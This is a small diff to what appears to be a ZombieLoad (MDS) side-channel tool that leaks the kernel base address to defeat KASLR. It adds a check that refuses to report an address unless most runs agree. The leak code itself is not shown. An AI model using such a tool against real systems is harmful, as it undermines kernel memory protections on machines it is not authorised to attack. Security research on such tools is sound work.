@@ -444,7 +444,8 @@ int main(void) {
     }
   }
 
-  /* Majority vote: select the address that appears most often */
+  /* Vote: find the address that appears most often across the runs. The
+   * agreement floor below decides whether that plurality is trustworthy. */
   unsigned long addr = 0;
   int best_count = 0;
   for (int i = 0; i < MDS_RUNS; i++) {
@@ -508,6 +509,23 @@ int main(void) {
     else
       fprintf(stderr, "[-] zombieload: no kernel address found "
                       "(signal present but no kernel text pattern detected)\n");
+    return 0;
+  }
+
+  /* Require a majority of runs to agree before trusting the base. The base is
+   * constant for the boot, so a working channel converges — every run
+   * reconstructs the same address. When the runs disagree, each candidate is
+   * a distinct base that merely passed the kernel-text signature at a
+   * different KASLR low byte: noise, not a leak. Reporting the plurality of
+   * that would fabricate a confident, wrong base every run (the same failure
+   * a scatter-minimum vote produces on a dead prefetch channel). Fail closed
+   * instead — an uncorroborated timing base is worse than none. */
+  if (best_count * 2 <= MDS_RUNS) {
+    fprintf(stderr,
+            "[-] zombieload: runs do not agree on a base (best %d/%d agree); "
+            "the recovered bytes are not converging on one address, so there "
+            "is no corroborated base to report\n",
+            best_count, MDS_RUNS);
     return 0;
   }
 
